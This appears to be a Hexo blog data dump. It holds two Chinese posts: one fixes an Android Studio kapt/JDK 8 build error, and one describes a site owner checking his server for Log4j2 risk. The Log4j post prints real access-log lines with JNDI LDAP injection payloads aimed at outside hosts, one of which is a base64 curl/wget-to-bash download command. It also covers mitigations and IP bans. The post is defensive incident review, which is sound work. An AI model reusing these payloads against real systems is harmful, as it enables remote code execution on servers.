style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>从Android Studio 4.1.3升级到最新的Arctic Fox之后，整个组件化工程会编译不过。<br><img src=\"https://imgconvert.csdnimg.cn/0f42f86e474e42b582277a3f314f1a1a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>编译错误显示：</p>\n<blockquote>\n<p><strong>e: [kapt] ‘com.sun.tools.javac.util.Context’ class can’t be found (‘tools.jar’ is absent in the plugin classpath). Kapt won’t work.</strong></p>\n</blockquote>\n<p>很多同学知难而退，被迫回滚到4.1.3，那怎么行呢？</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先说，这个错误不是组件化插件的问题，不是Kotlin的问题，也不是工程本身的代码问题，而是JDK没配置好导致的。</p>\n<p>但是有人会问了，为什么旧版Studio用得好好的，升级到新版就有JDK的问题了？因为新版Studio默认内置了JDK 11，Gradle会使用11来运行，放弃了JDK 8（细心的同学已经发现，启动界面的Runtime version已经变成了11，不再是8了）。</p>\n<p>如果不做任何设置，默认用JDK 11来编译工程，就会失败，当然错误提示不会是上面那个，是另一个，这里不赘述，我们还是以JDK 8来编译。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>1、我们先打开Studio的偏好设置（Preferences），然后<strong>修改Gradle JDK为1.8</strong>。</p>\n<p>一般来说它会检测你系统安装的JDK，如果没有，你就手动Add一下，Add到Home那一层，图中我的路径都是JDK的默认安装路径（我的JDK当初都是用brew直接install的openjdk）。<br><img src=\"https://imgconvert.csdnimg.cn/92366ae7745842daad7b841fc269f15c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>2、设置好之后，还要记得<strong>配置你的终端环境变量</strong>，这个是为了保证整个系统环境（包括脚本命令执行）都使用JDK 8，否则版本不一致也会出问题。</p>\n<p>如果是bash就修改.bashrc，我是用的zsh，所以编辑.zshrc：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim ~/.zshrc</span><br></pre></td></tr></table></figure>\n\n<p>追加内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> CLASSPATH=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home/lib</span><br><span class=\"line\"><span class=\"built_in\">export</span> JAVA_HOME=/Library/Java/JavaVirtualMachines/openjdk-8.jdk/Contents/Home</span><br></pre></td></tr></table></figure>\n\n<p>保存并退出。</p>\n<p>3、<strong>重启Studio，尝试Rebuild工程</strong>，如果没有问题，那恭喜你，不用继续往下看了。</p>\n<p>当然，绝大多数情况，就会出现本文最开始那个错误提示：找不到tools.jar。我们知道，这个jar包是JDK lib目录下面的：<br><img src=\"https://imgconvert.csdnimg.cn/7ed58e8b016847d38c5a43f8c6dd5d01.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6ZKI5Y-2,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\" alt=\"在这里插入图片描述\"><br>既然环境变量也配置了，怎么就提示错误呢？</p>\n<p>4、后来在网上搜了一下，发现是默认JDK的目录命名符号有问题，其实上面看到的 <strong>&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;openjdk-8.jdk</strong> 是个软链接，指向的真实路径是：</p>\n<p><strong>&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;openjdk@8&#x2F;1.8.0+282&#x2F;libexec&#x2F;openjdk.jdk</strong></p>\n<p>注意到里面的+号没有，这个玩意儿就是祸首。接下来我们修正错误：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /usr/local/Cellar/openjdk@8/</span><br><span class=\"line\"><span class=\"comment\"># 把+改成_</span></span><br><span class=\"line\"><span class=\"built_in\">mv</span> 1.8.0+282 1.8.0_282</span><br><span class=\"line\"><span class=\"comment\"># 去修正软链接，如果提示已存在就先sudo rm删掉</span></span><br><span class=\"line\">sudo <span class=\"built_in\">ln</span> -s /usr/local/Cellar/openjdk@8/1.8.0_282/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-8.jdk</span><br></pre></td></tr></table></figure>\n\n<p>此时再重新做一次上述第1步，设置JDK为1.8，再次Rebuild编译（建议先File → Invalidate Caches一下），成功。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>其实主要原因还是JDK配置的问题，可能新版Studio的Gradle在处理路径或者符号链接上面做了什么奇葩改动。</p>\n<p>理论上讲，如果你的JDK本身就配置得非常完美，那么只需要做好第1步，就不会有其他问题了。</p>\n<p>升级后部分UI中文变方块，解决办法是修改一下字体即可（Preferences → Appearance → Use custom font）。</p>\n"},{"layout":"post","title":"个人网站Log4j2漏洞风险排查","subtitle":"世纪漏洞。","date":"2022-01-11T16:00:00.000Z","author":"YSY","header-style":"text","catalog":true,"_content":"\n### 前言\n\nLog4j2漏洞事件已经过去了几个月，影响面可以说是非常的广。本质上还是权限和代码注入问题，这里就不作赘述，和SQL注入在原理和形式上都异曲同工。\n\n我个人没太明白还是，如此流行的开源库，竟然开发者和使用者这么久都没发现这个巨大漏洞（可能早有人发现但并未公布），而且作为一个日志记录工具，权限未免太高。\n\n### 修复\n\n从互联网上可以查到最新的修复建议：\n\n> 1. 升级到最新版本：\n>\n>    目前官方已推出最新Apache log4j 2.15.0版本，可从地址中下载升级：https://logging.apache.org/log4j/2.x/download.html\n>\n> 2. 缓解措施：\n>\n> （1）添加jvm启动参数 -Dlog4j2.formatMsgNoLookups=true  \n>\n> （2）在应用程序的classpath下添加log4j2.component.properties配置文件文件，文件内容：log4j2.formatMsgNoLookups=True\n>\n> （3）移除log4j-core包中JndiLookup 类文件，并重启服务\n>\n> 具体命令：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class\n>\n> （4）建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本\n>\n> （5）限制受影响应用对外访问互联网\n>\n> （6）禁用JNDI。如在spring.properties里添加spring.jndi.ignore=true\n>\n> （7）采用其他防护措施，更新WAF、RASP规则等\n\n### 排查\n\n其实在引起轩然大波之前，并没有多少人去尝试利用这个漏洞攻击别人的服务器，反倒是现在，一些阿猫阿狗也开始作妖。\n\n我们直接查询HTTP服务的access日志，就能知道是不是有人试图攻击你的小破站了：\n\n```bash\ncat access.log | grep jndi\n```\n\n好家伙，非常多，这里只列几个来示例：\n\n```bash\n195.54.160.149 - - [24/Dec/2021:14:22:15 +0800] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==} HTTP/1.1\" 200 1307\n221.199.187.100 - - [24/Dec/2021:21:01:54 +0800] \"GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1\" 404 196\n195.54.160.149 - - [25/Dec/2021:11:07:24 +0800] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==} HTTP/1.1\" 200 1307\n170.210.45.163 - - [26/Dec/2021:08:32:29 +0800] \"GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1\" 404 196\n195.54.160.149 - - [27/Dec/2021:03:06:53 +0800] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==} HTTP/1.1\" 200 1307\n175.6.210.66 - - [31/Dec/2021:00:53:40 +0800] \"GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:08 +0800] \"POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:09 +0800] \"GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:27 +0800] \"POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:28 +0800] \"GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1\" 404 196\n```\n\n天南海北的IP地址，我真是谢谢你们光顾啊。\n\n由于我的服务器并没有运行什么复杂的Web应用，所以问题应该不大，不然我估计连ssh都登不进去了。\n\n1. 不过，我们还是要排查一下现状，先检查项目依赖库有没有log4j2，版本是否更新到了修复版本。我的项目都是个人开发的小玩意，所以没用到这个玩意。\n2. 到关键目录中检索jar包，尤其是基于Java开发的，比如Apache HTTP目录、Tomcat目录以及一些自定义的正在运行的Java程序：\n\n```bash\n# 大概看下有哪些进程\nps -ef | grep java\n# 到关键目录下直接find库包，一旦发现散落的jar，要么更新要么删里面的漏洞class\nfind . -name \"log4j*\"\n```\n\n3. 通过上述的access访问日志，看看哪些疯子在高频攻击，直接把IP或者IP段给ban了，让他搁这儿装逼：\n\n```bash\n# 如果用的是比较老的系统，比如Ubuntu 16.04之类的，多半还是iptables\niptables -I INPUT -s 78.31.67.151 -j DROP\n\n# 如果是用的防火墙，比如CentOS 7上面\nfirewall-cmd --zone=public --add-rich-rule 'rule family=\"ipv4\" source address=\"78.31.67.151\" reject' --permanent\nfirewall-cmd --reload\n```\n\n4. 如果你还是不安心，先关机吧哈哈哈，断网才是终极大法，反正是个人网站。避避风头，把修复措施研究透彻，保证漏洞完全无法复现，再开机。\n\n","source":"_posts/2022-01-12-个人网站Log4j2漏洞风险排查.md","raw":"---\nlayout:     post\ntitle:      个人网站Log4j2漏洞风险排查\nsubtitle:   世纪漏洞。\ndate:       2022-01-12\nauthor:     YSY\nheader-style: text\ncatalog: true\ntags:\n    - 问题不大\n    - 后端\n---\n\n### 前言\n\nLog4j2漏洞事件已经过去了几个月，影响面可以说是非常的广。本质上还是权限和代码注入问题，这里就不作赘述，和SQL注入在原理和形式上都异曲同工。\n\n我个人没太明白还是，如此流行的开源库，竟然开发者和使用者这么久都没发现这个巨大漏洞（可能早有人发现但并未公布），而且作为一个日志记录工具，权限未免太高。\n\n### 修复\n\n从互联网上可以查到最新的修复建议：\n\n> 1. 升级到最新版本：\n>\n>    目前官方已推出最新Apache log4j 2.15.0版本，可从地址中下载升级：https://logging.apache.org/log4j/2.x/download.html\n>\n> 2. 缓解措施：\n>\n> （1）添加jvm启动参数 -Dlog4j2.formatMsgNoLookups=true  \n>\n> （2）在应用程序的classpath下添加log4j2.component.properties配置文件文件，文件内容：log4j2.formatMsgNoLookups=True\n>\n> （3）移除log4j-core包中JndiLookup 类文件，并重启服务\n>\n> 具体命令：zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class\n>\n> （4）建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本\n>\n> （5）限制受影响应用对外访问互联网\n>\n> （6）禁用JNDI。如在spring.properties里添加spring.jndi.ignore=true\n>\n> （7）采用其他防护措施，更新WAF、RASP规则等\n\n### 排查\n\n其实在引起轩然大波之前，并没有多少人去尝试利用这个漏洞攻击别人的服务器，反倒是现在，一些阿猫阿狗也开始作妖。\n\n我们直接查询HTTP服务的access日志，就能知道是不是有人试图攻击你的小破站了：\n\n```bash\ncat access.log | grep jndi\n```\n\n好家伙，非常多，这里只列几个来示例：\n\n```bash\n195.54.160.149 - - [24/Dec/2021:14:22:15 +0800] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==} HTTP/1.1\" 200 1307\n221.199.187.100 - - [24/Dec/2021:21:01:54 +0800] \"GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1\" 404 196\n195.54.160.149 - - [25/Dec/2021:11:07:24 +0800] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==} HTTP/1.1\" 200 1307\n170.210.45.163 - - [26/Dec/2021:08:32:29 +0800] \"GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1\" 404 196\n195.54.160.149 - - [27/Dec/2021:03:06:53 +0800] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==} HTTP/1.1\" 200 1307\n175.6.210.66 - - [31/Dec/2021:00:53:40 +0800] \"GET /${jndi:ldap://121.140.99.236:1389/Exploit} HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:08 +0800] \"POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:09 +0800] \"GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:27 +0800] \"POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1\" 404 196\n78.31.67.151 - - [09/Jan/2022:11:12:28 +0800] \"GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1\" 404 196\n```\n\n天南海北的IP地址，我真是谢谢你们光顾啊。\n\n由于我的服务器并没有运行什么复杂的Web应用，所以问题应该不大，不然我估计连ssh都登不进去了。\n\n1. 不过，我们还是要排查一下现状，先检查项目依赖库有没有log4j2，版本是否更新到了修复版本。我的项目都是个人开发的小玩意，所以没用到这个玩意。\n2. 到关键目录中检索jar包，尤其是基于Java开发的，比如Apache HTTP目录、Tomcat目录以及一些自定义的正在运行的Java程序：\n\n```bash\n# 大概看下有哪些进程\nps -ef | grep java\n# 到关键目录下直接find库包，一旦发现散落的jar，要么更新要么删里面的漏洞class\nfind . -name \"log4j*\"\n```\n\n3. 通过上述的access访问日志，看看哪些疯子在高频攻击，直接把IP或者IP段给ban了，让他搁这儿装逼：\n\n```bash\n# 如果用的是比较老的系统，比如Ubuntu 16.04之类的，多半还是iptables\niptables -I INPUT -s 78.31.67.151 -j DROP\n\n# 如果是用的防火墙，比如CentOS 7上面\nfirewall-cmd --zone=public --add-rich-rule 'rule family=\"ipv4\" source address=\"78.31.67.151\" reject' --permanent\nfirewall-cmd --reload\n```\n\n4. 如果你还是不安心，先关机吧哈哈哈，断网才是终极大法，反正是个人网站。避避风头，把修复措施研究透彻，保证漏洞完全无法复现，再开机。\n\n","slug":"个人网站Log4j2漏洞风险排查","published":1,"updated":"2024-03-25T07:31:25.986Z","comments":1,"photos":[],"link":"","_id":"cluaufh1i004hthe6bfof8lsw","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Log4j2漏洞事件已经过去了几个月，影响面可以说是非常的广。本质上还是权限和代码注入问题，这里就不作赘述，和SQL注入在原理和形式上都异曲同工。</p>\n<p>我个人没太明白还是，如此流行的开源库，竟然开发者和使用者这么久都没发现这个巨大漏洞（可能早有人发现但并未公布），而且作为一个日志记录工具，权限未免太高。</p>\n<h3 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>从互联网上可以查到最新的修复建议：</p>\n<blockquote>\n<ol>\n<li><p>升级到最新版本：</p>\n<p>目前官方已推出最新Apache log4j 2.15.0版本，可从地址中下载升级：<a href=\"https://logging.apache.org/log4j/2.x/download.html\">https://logging.apache.org/log4j/2.x/download.html</a></p>\n</li>\n<li><p>缓解措施：</p>\n</li>\n</ol>\n<p>（1）添加jvm启动参数 -Dlog4j2.formatMsgNoLookups&#x3D;true  </p>\n<p>（2）在应用程序的classpath下添加log4j2.component.properties配置文件文件，文件内容：log4j2.formatMsgNoLookups&#x3D;True</p>\n<p>（3）移除log4j-core包中JndiLookup 类文件，并重启服务</p>\n<p>具体命令：zip -q -d log4j-core-*.jar org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiLookup.class</p>\n<p>（4）建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本</p>\n<p>（5）限制受影响应用对外访问互联网</p>\n<p>（6）禁用JNDI。如在spring.properties里添加spring.jndi.ignore&#x3D;true</p>\n<p>（7）采用其他防护措施，更新WAF、RASP规则等</p>\n</blockquote>\n<h3 id=\"排查\"><a href=\"#排查\" class=\"headerlink\" title=\"排查\"></a>排查</h3><p>其实在引起轩然大波之前，并没有多少人去尝试利用这个漏洞攻击别人的服务器，反倒是现在，一些阿猫阿狗也开始作妖。</p>\n<p>我们直接查询HTTP服务的access日志，就能知道是不是有人试图攻击你的小破站了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> access.log | grep jndi</span><br></pre></td></tr></table></figure>\n\n<p>好家伙，非常多，这里只列几个来示例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">195.54.160.149 - - [24/Dec/2021:14:22:15 +0800] <span class=\"string\">&quot;GET /?x=<span class=\"variable\">$&#123;jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==&#125;</span> HTTP/1.1&quot;</span> 200 1307</span><br><span class=\"line\">221.199.187.100 - - [24/Dec/2021:21:01:54 +0800] <span class=\"string\">&quot;GET /<span class=\"variable\">$&#123;jndi:ldap://121.140.99.236:1389/Exploit&#125;</span> HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">195.54.160.149 - - [25/Dec/2021:11:07:24 +0800] <span class=\"string\">&quot;GET /?x=<span class=\"variable\">$&#123;jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==&#125;</span> HTTP/1.1&quot;</span> 200 1307</span><br><span class=\"line\">170.210.45.163 - - [26/Dec/2021:08:32:29 +0800] <span class=\"string\">&quot;GET /<span class=\"variable\">$&#123;jndi:ldap://121.140.99.236:1389/Exploit&#125;</span> HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">195.54.160.149 - - [27/Dec/2021:03:06:53 +0800] <span class=\"string\">&quot;GET /?x=<span class=\"variable\">$&#123;jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==&#125;</span> HTTP/1.1&quot;</span> 200 1307</span><br><span class=\"line\">175.6.210.66 - - [31/Dec/2021:00:53:40 +0800] <span class=\"string\">&quot;GET /<span class=\"variable\">$&#123;jndi:ldap://121.140.99.236:1389/Exploit&#125;</span> HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:08 +0800] <span class=\"string\">&quot;POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:09 +0800] <span class=\"string\">&quot;GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/nuzomt%7D HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:27 +0800] <span class=\"string\">&quot;POST /register?username=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">78.31.67.151 - - [09/Jan/2022:11:12:28 +0800] <span class=\"string\">&quot;GET /register?id=$%7Bjndi:ldap://78.31.67.151:1389/khslv8%7D HTTP/1.1&quot;</span> 404 196</span><br></pre></td></tr></table></figure>\n\n<p>天南海北的IP地址，我真是谢谢你们光顾啊。</p>\n<p>由于我的服务器并没有运行什么复杂的Web应用，所以问题应该不大，不然我估计连ssh都登不进去了。</p>\n<ol>\n<li>不过，我们还是要排查一下现状，先检查项目依赖库有没有log4j2，版本是否更新到了修复版本。我的项目都是个人开发的小玩意，所以没用到这个玩意。</li>\n<li>到关键目录中检索jar包，尤其是基于Java开发的，比如Apache HTTP目录、Tomcat目录以及一些自定义的正在运行的Java程序：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 大概看下有哪些进程</span></span><br><span class=\"line\">ps -ef | grep java</span><br><span class=\"line\"><span class=\"comment\"># 到关键目录下直接find库包，一旦发现散落的jar，要么更新要么删里面的漏洞class</span></span><br><span class=\"line\">find . -name <span class=\"string\">&quot;log4j*&quot;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>通过上述的access访问日志，看看哪些疯子在高频攻击，直接把IP或者IP段给ban了，让他搁这儿装逼：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 如果用的是比较老的系统，比如Ubuntu 16.04之类的，多半还是iptables</span></span><br><span class=\"line\">iptables -I INPUT -s 78.31.67.151 -j DROP</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 如果是用的防火墙，比如CentOS 7上面</span></span><br><span class=\"line\">firewall-cmd --zone=public --add-rich-rule <span class=\"string\">&#x27;rule family=&quot;ipv4&quot; source address=&quot;78.31.67.151&quot; reject&#x27;</span> --permanent</span><br><span class=\"line\">firewall-cmd --reload</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>如果你还是不安心，先关机吧哈哈哈，断网才是终极大法，反正是个人网站。避避风头，把修复措施研究透彻，保证漏洞完全无法复现，再开机。</li>\n</ol>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Log4j2漏洞事件已经过去了几个月，影响面可以说是非常的广。本质上还是权限和代码注入问题，这里就不作赘述，和SQL注入在原理和形式上都异曲同工。</p>\n<p>我个人没太明白还是，如此流行的开源库，竟然开发者和使用者这么久都没发现这个巨大漏洞（可能早有人发现但并未公布），而且作为一个日志记录工具，权限未免太高。</p>\n<h3 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h3><p>从互联网上可以查到最新的修复建议：</p>\n<blockquote>\n<ol>\n<li><p>升级到最新版本：</p>\n<p>目前官方已推出最新Apache log4j 2.15.0版本，可从地址中下载升级：<a href=\"https://logging.apache.org/log4j/2.x/download.html\">https://logging.apache.org/log4j/2.x/download.html</a></p>\n</li>\n<li><p>缓解措施：</p>\n</li>\n</ol>\n<p>（1）添加jvm启动参数 -Dlog4j2.formatMsgNoLookups&#x3D;true  </p>\n<p>（2）在应用程序的classpath下添加log4j2.component.properties配置文件文件，文件内容：log4j2.formatMsgNoLookups&#x3D;True</p>\n<p>（3）移除log4j-core包中JndiLookup 类文件，并重启服务</p>\n<p>具体命令：zip -q -d log4j-core-*.jar org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiLookup.class</p>\n<p>（4）建议JDK使用11.0.1、8u191、7u201、6u211及以上的高版本</p>\n<p>（5）限制受影响应用对外访问互联网</p>\n<p>（6）禁用JNDI。如在spring.properties里添加spring.jndi.ignore&#x3D;true</p>\n<p>（7）采用其他防护措施，更新WAF、RASP规则等</p>\n</blockquote>\n<h3 id=\"排查\"><a href=\"#排查\" class=\"headerlink\" title=\"排查\"></a>排查</h3><p>其实在引起轩然大波之前，并没有多少人去尝试利用这个漏洞攻击别人的服务器，反倒是现在，一些阿猫阿狗也开始作妖。</p>\n<p>我们直接查询HTTP服务的access日志，就能知道是不是有人试图攻击你的小破站了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> access.log | grep jndi</span><br></pre></td></tr></table></figure>\n\n<p>好家伙，非常多，这里只列几个来示例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">195.54.160.149 - - [24/Dec/2021:14:22:15 +0800] <span class=\"string\">&quot;GET /?x=<span class=\"variable\">$&#123;jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MHx8d2dldCAtcSAtTy0gMTk1LjU0LjE2MC4xNDk6NTg3NC8xLjE0LjY3LjEzODo4MCl8YmFzaA==&#125;</span> HTTP/1.1&quot;</span> 200 1307</span><br><span class=\"line\">221.199.187.100 - - [24/Dec/2021:21:01:54 +0800] <span class=\"string\">&quot;GET /<span class=\"variable\">$&#123;jndi:ldap://121.140.99.236:1389/Exploit&#125;</span> HTTP/1.1&quot;</span> 404 196</span><br><span class=\"line\">195.54.160.149 - - [25/Dec/2021:11:07:24 +0800] <span class=\"string\">&quot;GET /?x=<span 